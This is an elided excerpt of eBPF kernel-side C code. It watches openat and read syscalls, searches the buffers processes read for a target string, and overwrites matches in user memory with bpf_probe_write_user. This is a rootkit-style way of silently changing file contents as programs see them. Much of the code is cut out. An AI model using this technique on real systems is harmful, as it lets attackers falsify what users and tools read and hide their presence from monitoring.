...
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
	...
	bpf_probe_read_user(&check_filename, filename_len,
			    (char *)ctx->args[1]);
...
int find_possible_addrs(struct trace_event_raw_sys_exit *ctx)
{
	...
	long unsigned int *pbuff_addr =
		bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
	if (pbuff_addr == 0) {
		return 0;
	}
	int pid = pid_tgid >> 32;
	...
	for (unsigned int i = 0; i < loop_size; i++) {
		...
		for (unsigned int j = 0; j < local_buff_size; j++) {
			...
			if (local_buff[j] == text_find[0]) {
				...
				bpf_map_update_elem(&map_name_addrs,
						    &tofind_counter, &name_addr,
						    BPF_ANY);
				tofind_counter++;
			}
		}
...
int check_possible_addresses(struct trace_event_raw_sys_exit *ctx)
{
	...
	for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
		newline_counter = i;
		pName_addr =
			bpf_map_lookup_elem(&map_name_addrs, &newline_counter);
		if (pName_addr == 0) {
			break;
		}
		...
		if (j >= name_len) {
			...
			// ***********
			bpf_map_update_elem(&map_to_replace_addrs,
					    &match_counter, &name_addr,
					    BPF_ANY);
			match_counter++;
		}
...
int overwrite_addresses(struct trace_event_raw_sys_exit *ctx)
{
	...
	for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
		match_counter = i;
		pName_addr = bpf_map_lookup_elem(&map_to_replace_addrs,
						 &match_counter);
		if (pName_addr == 0) {
			break;
		}
		...
		long ret = bpf_probe_write_user((void *)name_addr,
						(void *)text_replace, text_len);
		// Send event
		struct event *e;
